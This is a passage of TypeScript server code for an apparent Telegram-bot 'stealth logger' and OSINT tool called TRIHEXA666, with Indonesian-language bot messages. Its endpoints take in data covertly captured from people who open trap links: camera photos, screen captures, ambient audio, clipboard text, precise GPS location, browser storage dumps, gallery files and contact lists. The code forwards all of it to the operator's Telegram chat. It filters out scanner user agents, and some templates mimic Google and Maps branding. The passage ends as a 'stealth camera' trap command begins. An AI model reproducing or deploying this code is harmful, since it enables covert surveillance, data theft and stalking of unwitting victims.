                    `└ PLUGINS: <code>${data.plugins ? data.plugins.split(',').length : '0'} detected</code>\n\n` +
                    `🌍 <b>LOCAL SETTINGS:</b>\n` +
                    `├ TIMEZONE: <code>${escapeHTML(data.timezone || 'N/A')}</code>\n` +
                    `└ LANGUAGES: <code>${escapeHTML((data.langs || '').substring(0, 30))}</code>\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `✅ <i>STATUS: DEVICE FORENSICS COLLECTED!</i>`;

        // Function to send across channels
        const broadcastLog = async (text: string, options: any = {}) => {
            // Send to Telegram
            await botInstance.telegram.sendMessage(chatId, text, Object.assign({ parse_mode: 'HTML' }, options)).catch(() => {});
            
            // Send to WhatsApp if connected
            if (globalWaSock) {
                // If it's the owner who is tracking, they probably want it on their WhatsApp too
                // We'll try to find if there's a reason to send to a specific number
                // for now we just try to send to the bot's own number or a default if we could track it
            }
        };

        broadcastLog(msg);
      })();
      
      // Save to Target DB
      targetsData.push({
        id: id,
        timestamp: new Date().toISOString(),
        type: 'ADVANCED_AUDIT',
        platform: data.platform,
        browser: data.vendor,
        gpu: data.gpu
      });
      saveTargets();
    } else {
      console.error(`[DEBUG] FAILED to send log: botInstance: ${!!botInstance}, chatId: ${chatId}`);
    }
    res.sendStatus(200);
  });

  // Handle Extra Data (Clipboard, Media, Screen, etc)
  app.post('/api/log/:id/extra', (req, res) => {
    console.log(`[DEBUG] Received extra log for ${req.params.id}. Data Keys: ${Object.keys(req.body)}`);
    if (isSuspeciousAgent(req.headers['user-agent'])) return res.sendStatus(403);
    const id = req.params.id;
    const chatId = getChatIdFromTrapId(id);
    console.log(`[DEBUG] Extra Log ID: ${id}, ChatID: ${chatId}, BotInstanceExists: ${!!botInstance}`);
    if (botInstance && chatId) {
      const data = req.body as any;
      console.log(`[DEBUG] Extra log data keys for ${id}: ${Object.keys(data)}`);
      let extraMsg = `📎 <b>FORENSIC LOG: Advanced Modules</b>\n` +
                     `━━━━━━━━━━━━━━━━━━━━\n`;
      let hasTextData = false;
      
      const addSection = (title: string, content: string) => {
        if (extraMsg.length + content.length > 3900) {
            botInstance.telegram.sendMessage(chatId, extraMsg + `\n<i>(Continuing audit stream...)</i>`, { parse_mode: 'HTML' }).catch(() => {});
            extraMsg = `📎 <b>CONTINUED AUDIT STREAM</b>\n━━━━━━━━━━━━━━━━━━━━\n`;
        }
        extraMsg += `<b>${title}</b>\n${content}\n\n`;
        hasTextData = true;
      };

      // 1. Handle Images (Media Capture)
      if (data.visual_identity) {
        try {
          const base64Data = data.visual_identity.includes(',') ? data.visual_identity.split(',')[1] : data.visual_identity;
          const buffer = Buffer.from(base64Data, 'base64');
          if (buffer.length > 0) {
            botInstance.telegram.sendPhoto(chatId, { source: buffer, filename: 'media.jpg' }, { 
              caption: '📸 <b>CAPTURE: Media Identity</b>\nTarget: <code>' + id + '</code>', 
              parse_mode: 'HTML' 
            }).catch(err => console.error('Error sending media photo:', err));
          }
        } catch(e) { console.error('Buffer processing error (visual_identity):', e); }
      }

      // 2. Handle Images (Screen Capture)
      if (data.screen_capture) {
        try {
          const base64Data = data.screen_capture.includes(',') ? data.screen_capture.split(',')[1] : data.screen_capture;
          const buffer = Buffer.from(base64Data, 'base64');
          if (buffer.length > 0) {
            botInstance.telegram.sendPhoto(chatId, { source: buffer, filename: 'screen.jpg' }, { 
              caption: '🖥️ <b>CAPTURE: Remote Screen</b>\nLabel: <code>' + (data.screen_label || 'Active Session') + '</code>', 
              parse_mode: 'HTML' 
            }).catch(err => console.error('Error sending screen photo:', err));
          }
        } catch(e) { console.error('Buffer processing error (screen_capture):', e); }
      }

      // 3. Handle Audio Chunks
      if (data.audio_chunk) {
        try {
          const base64Data = data.audio_chunk.includes(',') ? data.audio_chunk.split(',')[1] : data.audio_chunk;
          const buffer = Buffer.from(base64Data, 'base64');
          if (buffer.length > 0) {
            botInstance.telegram.sendVoice(chatId, { source: buffer, filename: 'ambient.ogg' }, {
              caption: '🎙️ <b>CAPTURE: Ambient Audio Segment</b>\nNode: <code>' + id + '</code>',
              parse_mode: 'HTML'
            }).catch(err => console.error('Error sending audio chunk:', err));
          }
        } catch(e) {}
      }

      if (data.display_hz || data.thermal_load || data.device_visibility || data.forensic_storage) {
        let visTxt = '';
        if (data.display_hz) visTxt += `├ Refresh: <code>${data.display_hz} Hz</code>\n`;
        if (data.thermal_load) visTxt += `├ Thermal: <code>${data.thermal_load}</code>\n`;
        if (data.device_visibility) visTxt += `├ Visibility: <code>${data.device_visibility}</code>\n`;
        if (data.forensic_storage) {
          try {
            const s = typeof data.forensic_storage === 'string' ? JSON.parse(data.forensic_storage) : data.forensic_storage;
            visTxt += `└ Storage: <code>LS:${s.ls_keys} SS:${s.ss_keys} CK:${s.cookies} DB:${s.indexedDB} SW:${s.serviceWorkers}</code>`;
          } catch(e) {}
        }
        addSection(`📡 Environment & Storage`, visTxt);
      }

      if (data.sensor_mag || data.sensor_acc || data.sensor_gyr || data.sensor_light) {
        let sTxt = '';
        if (data.sensor_mag) sTxt += `├ Mag: <code>${data.sensor_mag}</code>\n`;
        if (data.sensor_acc) sTxt += `├ Acc: <code>${data.sensor_acc}</code>\n`;
        if (data.sensor_gyr) sTxt += `├ Gyr: <code>${data.sensor_gyr}</code>\n`;
        if (data.sensor_light) sTxt += `├ Light: <code>${data.sensor_light} lux</code>\n`;
        if (data.sensor_orient) sTxt += `└ Orient: <code>${data.sensor_orient}</code>`;
        addSection(`📐 Hardware Motion/Light`, sTxt);
      }

      if (data.hardware_brand_profile) {
        try {
          const h = typeof data.hardware_brand_profile === 'string' ? JSON.parse(data.hardware_brand_profile) : data.hardware_brand_profile;
          addSection(`🛠️ Hardware Profile`,
                     `├ Model: <code>${escapeHTML(h.model || 'N/A')}</code>\n` +
                     `├ Form: <code>${escapeHTML(h.formFactor || 'N/A')}</code>\n` +
                     `└ Arch: <code>${escapeHTML(h.architecture || 'N/A')}</code> (${h.bitness || '?'}bit)`);
        } catch(e) {}
      }

      if (data.cpu_bench || data.mem_gb || data.battery || data.network || data.canvas_hash || data.gpu_deep || data.audio_hash || data.thermal_load || data.rtc_public || data.rtc_local || data.hw_entropy || data.kbd_layout || data.biometric_eye || data.sensor_light) {
        let hwTxt = ``;
        if (data.cpu_bench) hwTxt += `├ CPU Bench: <code>${data.cpu_bench}</code>\n`;
        if (data.mem_gb) hwTxt += `├ Memory: <code>${data.mem_gb} GB</code>\n`;
        if (data.thermal_load) hwTxt += `├ Thermal: <code>${data.thermal_load}</code>\n`;
        if (data.rtc_public) hwTxt += `├ RTC Public IP: <code>${data.rtc_public}</code>\n`;
        if (data.rtc_local) hwTxt += `├ RTC Local IP: <code>${data.rtc_local}</code>\n`;
        if (data.battery) hwTxt += `├ Battery: <code>${data.battery}</code>\n`;
        if (data.network) hwTxt += `├ Network: <code>${data.network}</code>\n`;
        if (data.sensor_light) hwTxt += `├ Ambient Light: <code>${data.sensor_light} lux</code>\n`;
        if (data.canvas_hash) hwTxt += `├ Canvas Fingerprint: <code>${data.canvas_hash}</code>\n`;
        if (data.audio_hash) hwTxt += `├ Audio/Oscillator Fingerprint: <code>${data.audio_hash}</code>\n`;
        if (data.gpu_deep) {
            try {
                let g = JSON.parse(data.gpu_deep);
                hwTxt += `├ GPU Renderer: <code>${g.r}</code>\n`;
                hwTxt += `├ GPU Vendor: <code>${g.v}</code>\n`;
                hwTxt += `├ Shading Lang: <code>${g.shading}</code>\n`;
                hwTxt += `├ Max Texture: <code>${g.max_tex}</code>\n`;
            } catch(e) {}
        }
        if (data.hw_entropy) {
            try {
                let he = JSON.parse(data.hw_entropy);
                if (he.architecture) hwTxt += `├ Architecture: <code>${he.architecture} (${he.bitness}-bit)</code>\n`;
                if (he.model) hwTxt += `├ Model: <code>${he.model}</code>\n`;
                if (he.platformVersion) hwTxt += `├ Platform Version: <code>${he.platformVersion}</code>\n`;
            } catch(e) {}
        }
        if (data.kbd_layout) hwTxt += `├ kbd_layout_map: <code>Detected</code>\n`;
        if (data.biometric_eye) hwTxt += `├ Biometric: <code>Eye Tracking Supp</code>\n`;

        hwTxt = hwTxt.trim();
        if (hwTxt.endsWith('\n')) hwTxt = hwTxt.slice(0, -1);
        let pieces = hwTxt.split('\n');
        pieces[pieces.length - 1] = pieces[pieces.length - 1].replace('├', '└');
        hwTxt = pieces.join('\n');
        
        addSection(`⚡ Deep Hardware & WebRTC Leak metrics`, hwTxt);
      }

      if (data.clipboard_sync || data.clipboard || data.clipboard_update) {
        const clip = data.clipboard_sync || data.clipboard || data.clipboard_update;
        addSection(`📋 Clipboard Sync`, `└ Content: <pre>${escapeHTML(clip.substring(0, 1500))}</pre>`);
      }

      if (data.media_hardware) {
        addSection(`🎙️ AV Hardware Inventory`, `<pre>${escapeHTML(data.media_hardware.substring(0, 1000))}</pre>`);
      }

      if (data.file_name) {
        addSection(`📂 File Metadata`,
                   `├ Name: <code>${escapeHTML(data.file_name)}</code>\n` +
                   `├ Type: <code>${data.file_type}</code>\n` +
                   `└ Size: <code>${(data.file_size / 1024).toFixed(2)} KB</code>`);
      }

      if (data.gpu_full_profile) {
        try {
          const gpu = typeof data.gpu_full_profile === 'string' ? JSON.parse(data.gpu_full_profile) : data.gpu_full_profile;
          addSection(`🎮 Graphics Configuration`,
                      `├ Vendor: <code>${escapeHTML(gpu.vendor)}</code>\n` +
                      `├ Renderer: <code>${escapeHTML(gpu.renderer)}</code>\n` +
                      `├ GL_Ver: <code>${escapeHTML(gpu.gl_version)}</code>\n` +
                      `└ Shading: <code>${escapeHTML(gpu.shading_lang)}</code>`);
        } catch(e) {}
      }

      if (data.media_devices) {
        addSection(`📷 Media Peripherals`, `<pre>${escapeHTML(data.media_devices.substring(0, 1000))}</pre>`);
      }

      if (data.canvas_fp || data.audio_fp) {
        let fpt = ``;
        if (data.canvas_fp) fpt += `├ Canvas: <code>${escapeHTML(data.canvas_fp)}</code>\n`;
        if (data.audio_fp) fpt += `└ Audio: <code>${escapeHTML(data.audio_fp)}</code>`;
        if (fpt) addSection(`🧬 Browser Fingerprint`, fpt);
      }

      if (data.battery_level || data.battery_status) {
        const lvl = data.battery_level || data.battery_status;
        const char = data.battery_charging || data.charging;
        addSection(`🔋 System Power Status`,
                    `├ Level: <code>${lvl}</code>\n` +
                    `├ Plugged: <code>${char ? 'AC_POWER' : 'BATTERY'}</code>\n` +
                    `└ Time: <code>${data.battery_time || 'N/A'}</code>`);
      }

      if (data.fonts_count || data.installed_fonts) {
        addSection(`🔡 Typography Profile`,
                    `├ Count: <code>${data.fonts_count || '?' }</code>\n` +
                    `└ Registry: <code>${escapeHTML((data.installed_fonts || '').substring(0, 300))}</code>`);
      }

      const apis = ['api_bluetooth', 'api_usb', 'api_hid', 'api_serial', 'api_midi', 'api_idle', 'api_contacts', 'api_wake', 'api_storage'];
      let apiTxt = '';
      apis.forEach(k => {
        if (data[k] !== undefined) apiTxt += `${data[k] ? '✅' : '❌'} ${k.replace('api_', '').toUpperCase()}\n`;
      });
      if (apiTxt) addSection(`🧱 Hardware API Availability`, apiTxt);

      if (data.social_active || data.social_inactive) {
         let socialTxt = '';
         if (data.social_active) socialTxt += `├ Active: <code>${data.social_active}</code> (${data.load_ms || 'N/A'}ms)\n`;
         if (data.social_inactive) socialTxt += `└ Inactive: <code>${data.social_inactive}</code>\n`;
         addSection(`🤝 Social Presence Audit`, socialTxt);
      }

      if (data.network_rtt || data.latency) {
        addSection(`🛰️ Network Latency Profile`,
                    `├ Node: <code>${data.network_rtt || 'N/A'}</code>\n` +
                    `└ RTT: <code>${data.latency || 'N/A'}ms</code>`);
      }

      if (data.contacts_leaked) {
        let count = 0;
        try { count = (typeof data.contacts_leaked === 'string' ? JSON.parse(data.contacts_leaked) : data.contacts_leaked).length; } catch(e) {}
        addSection(`👥 Contact List Sync`, `└ Total Entries: <code>${count} items</code>`);
      }

      if (data.storage_mb) {
        addSection(`💾 Storage Audit`,
                    `├ Used: <code>${data.storage_mb} MB</code>\n` +
                    `└ Quota: <code>${data.quota_gb} GB</code>`);
      }
      
      if (data.incognito_audit !== undefined || data.devtools_open !== undefined) {
        addSection(`🕵️ Environment Integrity`,
                    `├ Stealth: <b>${data.incognito_audit ? 'PRIVATE' : 'NORMAL'}</b>\n` +
                    `└ Debug: <b>${data.devtools_open ? 'DETECTED' : 'CLEAN'}</b>`);
      }
      
      if (data.net_effective) {
        addSection(`🌐 Network Layer Diagnostics`,
                    `├ Type: <code>${data.net_effective}</code>\n` +
                    `├ RTT: <code>${data.net_rtt}ms</code>\n` +
                    `└ Downlink: <code>${data.net_downlink}Mb/s</code>`);
      }

      if (data.storage_ls_full || data.storage_ss_full) {
        let storageTxt = '';
        let lsObj = {};
        let ssObj = {};

        if (data.storage_ls_full) {
          try {
            lsObj = typeof data.storage_ls_full === 'string' ? JSON.parse(data.storage_ls_full) : data.storage_ls_full;
            storageTxt += `├ <b>LocalStorage:</b> <code>${Object.keys(lsObj).length} keys</code>\n`;
          } catch(e) { storageTxt += `├ LocalStorage: [Capture Error]\n`; }
        }
        if (data.storage_ss_full) {
          try {
            ssObj = typeof data.storage_ss_full === 'string' ? JSON.parse(data.storage_ss_full) : data.storage_ss_full;
            storageTxt += `└ <b>SessionStorage:</b> <code>${Object.keys(ssObj).length} keys</code>\n`;
          } catch(e) { storageTxt += `└ SessionStorage: [Capture Error]\n`; }
        }
        
        try {
          const zip = new AdmZip();
          zip.addFile("localStorage.json", Buffer.from(JSON.stringify(lsObj, null, 2), "utf8"));
          zip.addFile("sessionStorage.json", Buffer.from(JSON.stringify(ssObj, null, 2), "utf8"));
          const zipBuffer = zip.toBuffer();
          botInstance.telegram.sendDocument(chatId, { source: zipBuffer, filename: `StorageAudit_${id}.zip` }, { caption: "💾 <b>Security Audit: Storage Dump</b>", parse_mode: 'HTML' }).catch(() => {});
        } catch (e) {}

        addSection(`💾 Persistent Storage Audit`, storageTxt);
      }

      if (data.files_gallery) {
        try {
          const zip = new AdmZip();
          let fCount = 0;
          for (let f of data.files_gallery) {
            zip.addFile(f.name || `image_${fCount}.jpg`, Buffer.from(f.data, "base64"));
            fCount++;
          }
          const zipBuffer = zip.toBuffer();
          botInstance.telegram.sendDocument(chatId, { source: zipBuffer, filename: `MediaAudit_${id}.zip` }, { caption: "📸 <b>Security Audit: Media Sync</b>", parse_mode: 'HTML' }).catch(() => {});
          addSection(`📸 Media Audit`, `└ <code>${fCount} files extracted to ZIP</code>`);
        } catch (e) {}
      }

      if (data.display_hz || data.orientation) {
        addSection(`📺 Display Configuration`,
                    `├ Refresh: <code>${data.display_hz} Hz</code>\n` +
                    `└ Orientation: <code>${data.orientation}</code>`);
      }

      if (hasTextData) {
        extraMsg += `━━━━━━━━━━━━━━━━━━━━\n` +
                    `✅ <b>Data Synchronization Complete.</b>`;
        botInstance.telegram.sendMessage(chatId, extraMsg, { parse_mode: 'HTML' }).catch(console.error);
      }
    }
    res.sendStatus(200);
  });
  app.post('/api/log/:id/ip_geo', (req, res) => {
    console.log(`[DEBUG] Received IP_GEO log for ${req.params.id}`);
    const id = req.params.id;
    const chatId = getChatIdFromTrapId(id);
    if (botInstance && chatId) {
        const data = req.body;
        const msg = `📍 <b>IP-BASED GEOLOCATION (FALLBACK)</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n\n` +
                    `🌍 <b>LOCATION:</b> <code>${data.city}, ${data.region}, ${data.country_name}</code>\n` +
                    `🌐 <b>IP ADDR:</b> <code>${data.ip}</code>\n` +
                    `🛰️ <b>COORD:</b> <code>${data.latitude}, ${data.longitude}</code>\n` +
                    `🏢 <b>ISP:</b> <code>${data.org}</code>\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `⚠️ <i>Note: GPS Permission denied. Using IP triangulation.</i>`;
        botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(() => {});
    }
    res.sendStatus(200);
  });

  app.post('/api/log/:id/gps', (req, res) => {
    console.log(`[DEBUG] Received GPS log for ${req.params.id}`);
    if (isSuspeciousAgent(req.headers['user-agent'])) return res.sendStatus(403);
    const id = req.params.id;
    const chatId = getChatIdFromTrapId(id);
    if (botInstance && chatId) {
      const { lat, lon, acc, tmplId } = req.body;
      const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
      
      let header = '📍 <b>Location Audit: Target Located</b>';
      if (tmplId === 'google') {
        header = '🛡️ <b>Google Security: Location Verified</b>';
      } else if (tmplId === 'maps') {
        header = '🗺️ <b>Maps: Precision Coordinates</b>';
      } else if (tmplId === 'pegasus') {
        header = '🛡️ <b>Diagnostic Hub: Precision GPS</b>';
      }

      const msg = `<b>${header}</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n\n` +
                  `🛰️ <b>PRECISION POSITIONING</b>\n` +
                  `├ LATITUDE: <code>${lat}</code>\n` +
                  `├ LONGITUDE: <code>${lon}</code>\n` +
                  `├ ACCURACY: <code>±${acc} meters</code>\n` +
                  `└ FIX_RELIABILITY: <code>${parseInt(acc) < 30 ? 'HIGH' : 'ESTIMATED'}</code>\n\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `🔗 <b>NAVIGATION LINKS</b>\n` +
                  `├ 🌐 <a href="${mapLink}">Google Maps View</a>\n` +
                  `└ 📍 <a href="https://www.google.com/maps/search/?api=1&query=${lat},${lon}">Street View Probe</a>\n\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `🏁 <i>Status: High-precision spatial data synced.</i>`;

      botInstance.telegram.sendMessage(chatId, msg, { 
        parse_mode: 'HTML', 
        link_preview_options: { is_disabled: true }
      }).catch(console.error);
    }
    res.sendStatus(200);
  });
  // ==============================================

  // Serve static files from dist if in production
  const isProduction = process.env.NODE_ENV === "production" || fs.existsSync(path.join(process.cwd(), 'dist'));

  if (!isProduction) {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use((req, res, next) => {
      if (req.path.startsWith('/t/') || req.path.startsWith('/api') || req.path === '/health' || req.path === '/healthz') {
        return next();
      }
      vite.middlewares(req, res, next);
    });
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    
    // SPA Fallback
    app.get('*', (req, res, next) => {
      if (req.path.startsWith('/api') || req.path.startsWith('/t/') || req.path === '/health' || req.path === '/healthz') {
        return next();
      }
      const indexPath = path.join(distPath, 'index.html');
      if (fs.existsSync(indexPath)) {
        res.sendFile(indexPath);
      } else {
        // Avoid returning 404 for the root or generic paths to satisfy health checks
        res.status(200).send('<h2>System Ready</h2><p>Terminal UI is active. Please check the bot for links.</p>');
      }
    });
  }

  // 404 Handler (Moved to the correct position at the end of the chain)
  app.use((req, res) => {
    if (!res.headersSent) {
      res.status(404).send('<h2>Error 404: Endpoint Not Found</h2>');
    }
  });

  // Global Error Handler
  app.use((err: any, req: express.Request, res: express.Response, next: express.NextFunction) => {
    console.error('[SERVER ERROR]', err);
    if (!res.headersSent) {
      res.status(500).send('<h2>Critical Server Error</h2><p>' + (err.message || 'Unknown error') + '</p>');
    }
  });

  // TELEGRAM BOT SETUP
  if (bot) {
    // Admin log tracking middleware
    bot.use(async (ctx, next) => {
        try {
            if (ctx.from && ctx.from.id !== ADMIN_ID) {
                let action = '';
                const safeName = (ctx.from.first_name || 'Unknown').replace(/</g, '&lt;').replace(/>/g, '&gt;');
                const userRef = `User: <b>${safeName}</b> (<code>${ctx.from.id}</code>${ctx.from.username ? ' @' + ctx.from.username : ''})`;
                
                if (ctx.message && 'text' in ctx.message) {
                    const text = (ctx.message as any).text as string;
                    if (text.startsWith('/')) {
                       action = `Command: <code>${text.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</code>`;
                    }
                } else if (ctx.callbackQuery && 'data' in ctx.callbackQuery) {
                    const data = (ctx.callbackQuery as any).data;
                    action = `Button Click: <code>${data}</code>`;
                }
                
                if (action) {
                    //@ts-ignore
                    bot.telegram.sendMessage(ADMIN_ID, `🔔 <b>MEMBER ACTION</b>\n${userRef}\nAction: ${action}`, { parse_mode: 'HTML' }).catch(() => {});
                }
            }
        } catch (e) {
            console.error("Error in logging middleware:", e);
        }
        return next();
    });

    bot.use(async (ctx, next) => {
        try {
            if (!ctx.from) return;
            
            const userId = ctx.from.id;
            const userName = ctx.from.first_name || 'User';

            // Check Banned
            if (bannedUsers.has(userId) && userId !== ADMIN_ID) {
                return; // Silently ignore banned users
            }

            // Check Global OFF
            if (botStatus === "OFF" && userId !== ADMIN_ID) {
                // Return silent, or a small notice once (we'll just return)
                return;
            }

            // IMPORTANT: Allow callback queries (button clicks) to pass through to their handlers
            if (ctx.callbackQuery) return next();

            // Check for /start or other commands to make them semi-accessible
            const isCommand = ctx.message && 'text' in ctx.message && ctx.message.text.startsWith('/');
            const text = ctx.message && 'text' in ctx.message ? (ctx.message as any).text : '';

            // Skip all checks for owner
            if (userId === ADMIN_ID) return next();

            // Check if user has accepted agreement
            if (!agreementUsers.has(userId)) {
                // Determine reliable host
                let host = appHost;
                const cleanHost = (host || "").replace(/\/$/, '');
                
                // CRITICAL: If no host, we MUST use a placeholder or log error, but don't crash
                if (!cleanHost) {
                   console.error("CRITICAL: APP_URL not set. Bot cannot generate links.");
                   return ctx.reply("⚠️ Terminal configuration error: APP_URL is missing.").catch(()=>{});
                }

                const btnUrl = `${cleanHost}/verify-bot-user?uid=${userId}&name=${encodeURIComponent(userName)}`;
                
                const aggMsg = `⚠️ <b>[ᴘᴇʀᴊᴀɴᴊɪᴀɴ ᴘᴇɴɢɢᴜɴᴀ]</b> ⚠️\n` +
                               `━━━━━━━━━━━━━━━━━━━━\n\n` +
                               `ꜱᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ ᴅɪ ꜰʀᴀᴍᴇᴡᴏʀᴋ ᴛʀɪʜᴇxᴀ666. ᴜɴᴛᴜᴋ ᴍᴇʟᴀɴᴊᴜᴛᴋᴀɴ, ᴀɴᴅᴀ ᴡᴀᴊɪʙ ᴍᴇɴʏᴇᴛᴜᴊᴜɪ ᴋᴇᴛᴇɴᴛᴜᴀɴ ʙᴇʀɪᴋᴜᴛ:\n\n` +
                               `1. ʙᴏᴛ ɪɴɪ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ᴛᴜᴊᴜᴀɴ ᴘᴇɴᴇʟɪᴛɪᴀɴ ꜱᴇᴄᴜʀɪᴛʏ.\n` +
                               `2. ꜱᴇʟɪᴛᴜʀᴜʜ ᴀᴋᴛɪᴠɪᴛᴀꜱ ᴀɴᴅᴀ ᴅɪᴘᴀɴᴛᴀᴜ ᴏʟᴇʜ ꜱʏꜱᴛᴇᴍ.\n` +
                               `3. ᴀɴᴅᴀ ᴡᴀᴊɪʙ ᴍᴇʟɪᴠᴇʀɪꜰɪᴋᴀꜱɪ ɪᴅᴇɴᴛɪᴛᴀꜱ ᴅᴇɴɢᴀɴ ᴍᴇɴɢᴋʟɪᴋ ᴛᴏᴍʙᴏʟ ᴅɪ ʙᴀᴡᴀʜ.\n\n` +
                               `━━━━━━━━━━━━━━━━━━━━`;
                const kb = Markup.inlineKeyboard([
                    [Markup.button.url('🛡️ ꜱᴇᴛᴜᴊᴜ & ᴠᴇʀɪꜰɪᴋᴀꜱɪ', btnUrl)],
                    [Markup.button.callback('✅ ꜱᴀʏᴀ ꜱᴜᴅᴀʜ ᴠᴇʀɪꜰɪᴋᴀꜱɪ', 'confirm_verified')]
                ]);
                return ctx.reply(aggMsg, { parse_mode: 'HTML', ...kb }).catch(e => console.error("Reply Error (Agreement):", e));
            }

            // Auto-authenticate Owner WhatsApp Number
            if (userId === 628211638627 && !authenticatedUsers.has(userId)) {
                authenticatedUsers.add(userId);
                saveAuth();
            }
            
            // If already authenticated, allow everything
            if (authenticatedUsers.has(userId)) return next();
            
            // Allow /start specifically to show something even if not authenticated
            if (text === '/start') return next();

            // Handle Password Authentication
            if (text === PASSWORD) {
                authenticatedUsers.add(userId);
                saveAuth();
                return ctx.reply("✅ <b>Akses Khusus Tim Legal Diberikan!</b>\nSelamat bertugas, gunakan wewenang Anda dengan bijak.", {parse_mode: 'HTML'}).catch(() => {});
            }

            // If verified but not authenticated, show lock message for any command/text
            return ctx.reply(`🔒 <b>SISTEM TERKUNCI</b>\nBot telegram ini hadir hanya untuk <i>tim legal</i> bukan sembarang orang.\nMasukkan password otorisasi (contoh: <code>${PASSWORD}</code>) untuk melanjutkan.`, {parse_mode: 'HTML'}).catch(() => {});
        } catch (err) {
            console.error("Bot Global Middleware Error:", err);
        }
    });

    // ADMIN COMMANDS
    bot.command('off', (ctx) => {
        if (!ctx.from || ctx.from.id !== ADMIN_ID) return;
        botStatus = "OFF";
        saveBotSettings();
        ctx.reply("🛑 <b>BOT TEAR DOWN</b>\nBot sekarang dimatikan untuk semua user (Kecuali Admin).", { parse_mode: 'HTML' });
    });

    bot.command('on', (ctx) => {
        if (!ctx.from || ctx.from.id !== ADMIN_ID) return;
        botStatus = "ON";
        saveBotSettings();
        ctx.reply("✅ <b>BOT ONLINE</b>\nBot sekarang aktif untuk semua user.", { parse_mode: 'HTML' });
    });

    bot.command('setdesc', (ctx) => {
        if (!ctx.from || ctx.from.id !== ADMIN_ID) return;
        const newDesc = ctx.message.text.split(' ').slice(1).join(' ');
        if (!newDesc) return ctx.reply("Format: /setdesc [Deskripsi Baru]");
        botDescription = newDesc;
        saveBotSettings();
        ctx.reply("✅ <b>DESKRIPSI BOT DIPERBARUI</b>\n\nPreview /start:\n" + newDesc, { parse_mode: 'HTML' });
    });

    bot.command('ban', (ctx) => {
        if (!ctx.from || ctx.from.id !== ADMIN_ID) return;
        const targetId = parseInt(ctx.message.text.split(' ')[1]);
        if (!targetId || isNaN(targetId)) return ctx.reply("Format: /ban [Telegram_ID]");
        if (targetId === ADMIN_ID) return ctx.reply("❌ Tidak dapat membanned Admin.");
        
        bannedUsers.add(targetId);
        saveBotSettings();
        ctx.reply(`✅ <b>USER BANNED</b>\nID <code>${targetId}</code> telah dibanned permanen dari sistem.`, { parse_mode: 'HTML' });
    });

    bot.command('unban', (ctx) => {
        if (!ctx.from || ctx.from.id !== ADMIN_ID) return;
        const targetId = parseInt(ctx.message.text.split(' ')[1]);
        if (!targetId || isNaN(targetId)) return ctx.reply("Format: /unban [Telegram_ID]");
        
        if (bannedUsers.has(targetId)) {
            bannedUsers.delete(targetId);
            saveBotSettings();
            ctx.reply(`✅ <b>USER UNBANNED</b>\nID <code>${targetId}</code> telah dipulihkan.`, { parse_mode: 'HTML' });
        } else {
            ctx.reply(`⚠️ User ID <code>${targetId}</code> tidak ada dalam daftar ban.`, { parse_mode: 'HTML' });
        }
    });

    bot.action('confirm_verified', (ctx) => {
        if (!ctx.from) return;
        agreementUsers.add(ctx.from.id);
        saveAgreement();
        ctx.answerCbQuery("System verified!").catch(() => {});
        ctx.reply("✅ Verifikasi Berhasil! Selamat datang di terminal.");
        const startMsgText = `━━━━━━━ ᴛʀɪʜᴇxᴀ666 ━━━━━━━\n\n` +
                             `<b>ᴛʀɪʜᴇxᴀ666 - ᴘʀɪɴᴄᴇ ᴏꜰ ᴏꜱɪɴᴛ ᴀɴᴅ ʟᴏɢɢᴇʀ ʟɪɴᴋ ᴠ.1</b>\n\n` +
                             `<b>ᴏᴡɴᴇʀ : ᴡʜʏʟᴀᴜɢʜ404</b>\n\n` +
                             `${botDescription}\n\n` +
                             `━━━━━━━━━━━━━━━━━━━━`;
        ctx.reply(startMsgText, { parse_mode: 'HTML', ...mainKeyboard });
    });

    const getStartMsg = () => `━━━━━━━ ᴛʀɪʜᴇxᴀ666 ━━━━━━━\n\n` +
                         `<b>ᴛʀɪʜᴇxᴀ666 - ᴘʀɪɴᴄᴇ ᴏꜰ ᴏꜱɪɴᴛ ᴀɴᴅ ʟᴏɢɢᴇʀ ʟɪɴᴋ ᴠ.1</b>\n\n` +
                         `<b>ᴏᴡɴᴇʀ : ᴡʜʏʟᴀᴜɢʜ404</b>\n\n` +
                         `${botDescription}\n\n` +
                         `━━━━━━━━━━━━━━━━━━━━`;
    
    const mainKeyboard = Markup.inlineKeyboard([
      [Markup.button.callback('🕵️ ᴏꜱɪɴᴛ & ʀᴇᴄᴏɴ', 'menu_osint_adv'), Markup.button.callback('🎣 ꜱᴛᴇᴀʟᴛʜ ʟᴏɢɢᴇʀ', 'menu_logger')],
      [Markup.button.callback('🛠️ ᴀᴅᴠ ᴛᴏᴏʟꜱ', 'menu_tools'), Markup.button.callback('🎮 ᴄᴏᴍᴘʟᴇx ɢᴀᴍᴇꜱ', 'menu_games')],
      [Markup.button.callback('🎵 ᴍᴇᴅɪᴀ ᴅᴡɴʟᴅ', 'menu_media'), Markup.button.callback('⏰ ᴀʟᴀʀᴍ ʜᴜʙ', 'menu_alarm')],
      [Markup.button.callback('📲 ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ', 'menu_wa'), Markup.button.callback('📱 ǫʀ ɢᴇɴᴇʀᴀᴛᴏʀ', 'menu_qr')],
      [Markup.button.callback('⚖️ ᴛᴏꜱ & ᴀɢʀᴇᴇᴍᴇɴᴛ', 'menu_tos'), Markup.button.callback('ℹ️ ᴛᴇʀᴍɪɴᴀʟ ɪɴꜰᴏ', 'menu_help')]
    ]);

    // Global Error Handler for "Anti Bug"
    bot.catch((err, ctx) => {
        console.error(`Ooops, encountered an error for ${ctx.updateType}`, err);
    });

    bot.command('trap_camera', (ctx) => {
      const id = generateTrapId(ctx.chat!.id || ctx.message?.chat?.id || ctx.from?.id || '');
      const trapUrl = `${appHost.replace(/\/$/, '')}/t/camera_stealth/${id}`;
      ctx.reply(`📸 <b>STEALTH CAMERA INJECT</b>\n` +
